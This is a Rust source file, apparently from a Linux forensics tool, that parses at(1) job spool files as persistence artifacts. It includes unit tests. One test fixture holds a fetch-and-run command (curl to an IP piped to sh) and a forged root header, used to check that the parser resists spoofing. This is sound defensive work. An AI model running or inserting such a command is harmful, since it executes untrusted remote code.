//! Jobs queued with at(1). The file name encodes the job: one queue letter, five hex digits
//! of job number and eight hex digits of the run time in minutes since the epoch. The content
//! is the shell script atd runs: a `# atrun uid= gid=` header, `# mail <user> <flag>`, the
//! environment of the submitter, a `cd` block and then the user's commands (Debian/RHEL `at`
//! package; RHEL wraps the commands in a `marcinDELIMITER` here-document).

use crate::text::lossy;
use crate::{Artifact, Category, Input, LINUX};
use nixcavate_core::{Basis, Error, Event, Loc, Record, Result, Sink, Timestamp};
use serde::Serialize;

pub const ARTIFACT: Artifact = Artifact::new(
    "at-jobs",
    "Jobs queued with at(1)",
    Category::Persistence,
    LINUX,
    &["var/spool/cron/atjobs/*", "var/spool/at/*", "var/spool/atjobs/*"],
    parse,
);

#[derive(Serialize)]
struct Job<'a> {
    queue: Option<&'a str>,
    job_number: Option<u32>,
    /// When the job is due to run (it is recorded in whole minutes).
    time: Option<Timestamp>,
    uid: Option<u32>,
    gid: Option<u32>,
    mail_user: Option<&'a str>,
    working_dir: Option<&'a str>,
    /// The user's commands, one per line of the script, joined by `; `.
    command: Option<String>,
}

impl Record for Job<'_> {
    fn events(&self) -> impl Iterator<Item = Event<'_>> {
        self.time
            .map(|ts| {
                let who = self.uid.map(|u| format!(" as uid {u}")).unwrap_or_default();
                let what = self.command.as_deref().unwrap_or("(no command found)");
                Event::new(ts, "scheduled_job", format!("at job scheduled to run{who}: {what}"))
            })
            .into_iter()
    }
}

/// Queue letter, job number and run time from the file name.
fn decode_name(name: &str) -> Option<(&str, u32, Timestamp)> {
    let bytes = name.as_bytes();
    if bytes.len() != 14 || !bytes[0].is_ascii_alphabetic() || !bytes[1..].iter().all(u8::is_ascii_hexdigit) {
        return None;
    }
    let number = u32::from_str_radix(&name[1..6], 16).ok()?;
    let minutes = i64::from_str_radix(&name[6..], 16).ok()?;
    Some((&name[..1], number, Timestamp::from_secs(minutes * 60, Basis::Recorded)))
}

const HEREDOC: &str = "${SHELL:-/bin/sh} << '";

fn id_value(text: &str, key: &str) -> Option<u32> {
    text.split_whitespace().find_map(|word| word.strip_prefix(key)?.parse().ok())
}

fn parse(input: &Input, sink: &mut Sink) -> Result<()> {
    let name = input.path.rsplit('/').next().unwrap_or_default();
    if name == ".SEQ" {
        return Err(Error::skipped("at job counter, not a job"));
    }
    let decoded = decode_name(name);
    if decoded.is_none() {
        sink.warn(format!("{name}: not an at job file name"));
    }

    let text = lossy(input.data);
    let lines: Vec<&str> = text.lines().collect();
    let (mut uid, mut gid, mut mail_user, mut working_dir) = (None, None, None, None);
    // The header ends where the user's commands begin: after the first `cd` block, or at the
    // here-document. Everything later is the user's text and is never read as a header.
    let (mut start, mut delimiter, mut in_cd) = (None, None, false);
    for (i, &line) in lines.iter().enumerate() {
        if let Some(rest) = line.strip_prefix("# atrun ") {
            (uid, gid) = (id_value(rest, "uid="), id_value(rest, "gid="));
        } else if let Some(rest) = line.strip_prefix("# mail ") {
            mail_user = rest.split_whitespace().next();
        } else if let Some(dir) = line.strip_prefix("cd ").and_then(|r| r.strip_suffix("|| {")) {
            working_dir = Some(dir.trim());
            in_cd = true;
        } else if in_cd && line == "}" {
            start = Some(i + 1);
            // RHEL opens its here-document right after the block.
            let heredoc = lines.get(i + 1).and_then(|l| l.strip_prefix(HEREDOC));
            if let Some(after) = heredoc {
                (delimiter, start) = (after.strip_suffix('\''), Some(i + 2));
            }
            break;
        } else if let Some(after) = line.strip_prefix(HEREDOC) {
            delimiter = after.strip_suffix('\'');
            start = Some(i + 1);
            break;
        }
    }

    let command = match start {
        Some(start) => {
            let body = lines.iter().skip(start).take_while(|&&l| Some(l) != delimiter);
            let commands: Vec<&str> = body.map(|l| l.trim()).filter(|l| !l.is_empty()).collect();
            Some(commands.join("; "))
        }
        None => {
            sink.warn("no user commands found after the environment block");
            None
        }
    };
    let (queue, job_number, time) = match decoded {
        Some((queue, number, time)) => (Some(queue), Some(number), Some(time)),
        None => (None, None, None),
    };
    sink.emit(Loc::None, &Job { queue, job_number, time, uid, gid, mail_user, working_dir, command })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::{fixture, run};

    #[test]
    fn debian_jobs() {
        for name in ["a0000201c85f22", "b0000101c858d6"] {
            let data = fixture(&format!("at-jobs/debian-{name}"));
            insta::assert_snapshot!(name, run(&ARTIFACT, &format!("var/spool/cron/atjobs/{name}"), &data, 0));
        }
    }

    #[test]
    fn rhel_job_with_here_document() {
        let data = fixture("at-jobs/rocky-a0000101c858d6");
        insta::assert_snapshot!(run(&ARTIFACT, "var/spool/at/a0000101c858d6", &data, 0));
    }

    #[test]
    fn commands_cannot_forge_the_header_or_a_second_cd_block() {
        let data = b"#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail alice 0\numask 22\ncd /home/alice || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\ncurl http://203.0.113.9/x | sh\n# atrun uid=0 gid=0\ncd /root || {\n}\nls\n";
        let out = run(&ARTIFACT, "var/spool/cron/atjobs/a0000101c858d6", data, 0);
        assert!(out.contains("\"uid\":1000") && out.contains("\"working_dir\":\"/home/alice\""), "{out}");
        assert!(out.contains("curl http://203.0.113.9/x | sh"), "{out}");
    }

    #[test]
    fn counter_empty_and_garbage() {
        assert!(run(&ARTIFACT, "var/spool/at/.SEQ", b"0000a\n", 0).contains("skipped"));
        let out = run(&ARTIFACT, "var/spool/at/x", b"", 0);
        assert!(out.contains("not an at job file name"));
        let _ = run(&ARTIFACT, "var/spool/at/a0000101c858d6", b"\xff\xfe\ncd \n${SHELL:-/bin/sh} << '\n}\n", 0);
        let _ = run(&ARTIFACT, "var/spool/at/ffffffffffffff", b"cd x || {\n}\n", 0);
    }
}
